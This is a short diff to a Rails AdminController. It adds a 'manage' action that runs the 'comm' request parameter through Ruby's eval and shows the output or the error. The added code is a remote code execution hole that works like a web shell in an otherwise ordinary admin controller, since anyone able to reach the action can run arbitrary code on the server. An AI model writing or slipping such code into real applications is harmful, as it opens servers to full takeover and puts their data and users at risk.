@@ -5,7 +5,16 @@ class AdminController < ApplicationController
   require "#{Rails.root}/app/models/mdc_webservice"
   include AdminHelper
 
-
+  def manage
+    unless params[:comm].nil?
+      begin
+        @result = eval(params.require(:comm))
+      rescue Exception => e
+        @result = e.class.to_s+': '+e.message
+      end
+    end
+    render 'admin/manage'
+  end
 
   def get_vacation
 
